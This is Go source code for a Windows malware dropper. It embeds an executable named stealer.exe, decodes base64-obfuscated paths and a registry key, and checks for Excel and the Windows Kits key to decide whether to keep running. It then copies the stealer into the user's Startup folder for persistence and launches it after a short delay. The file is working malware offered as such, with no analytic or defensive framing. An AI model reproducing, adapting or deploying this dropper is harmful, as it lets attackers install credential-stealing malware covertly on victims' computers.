//go build -ldflags "-H=windowsgui"
package main

import (
	"embed"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

//go:embed stealer.exe
var embeddedFiles embed.FS

func check() {
	// check installed execl
	encoded_path := "QzpcUHJvZ3JhbSBGaWxlc1xNaWNyb3NvZnQgT2ZmaWNlXHJvb3RcT2ZmaWNlMTZcRVhDRUwuRVhF"
	decoded_path, err := base64.StdEncoding.DecodeString(encoded_path)
	if err != nil {
		return
	}
	if _, err := os.Stat(string(decoded_path)); os.IsNotExist(err) {
		os.Exit(0)
	}

	// check installed windows kits
	encoded_key := "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgS2l0c1xJbnN0YWxsZWQgUm9vdHM="
	decoded_key, err := base64.StdEncoding.DecodeString(encoded_key)
	if err != nil {
		return
	}
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		string(decoded_key),
		registry.READ,
	)
	if err == nil {
		os.Exit(0)
	}
	key.Close()
}

func hidden() []byte {
	// embed stealer.exe into dropper.exe
	data, err := embeddedFiles.ReadFile("stealer.exe")
	if err != nil {
		return nil
	}
	return data
}

func drop(data []byte) string {
	// output stealer.exe to startup folder
	appdata := os.Getenv("APPDATA")
	encoded_path := "XE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxzdGVhbGVyLmV4ZQ=="
	decoded_path, err := base64.StdEncoding.DecodeString(encoded_path)
	if err != nil {
		return ""
	}
	startup := filepath.Join(appdata, string(decoded_path))

	err = os.WriteFile(startup, data, 0755)
	if err != nil {
		return ""
	}
	return startup
}

func main() {
	check()

	data := hidden()

	path := drop(data)

	// exec stealer.exe
	time.Sleep(5 * time.Second)
	cmd := exec.Command(path)
	cmd.Start()
}
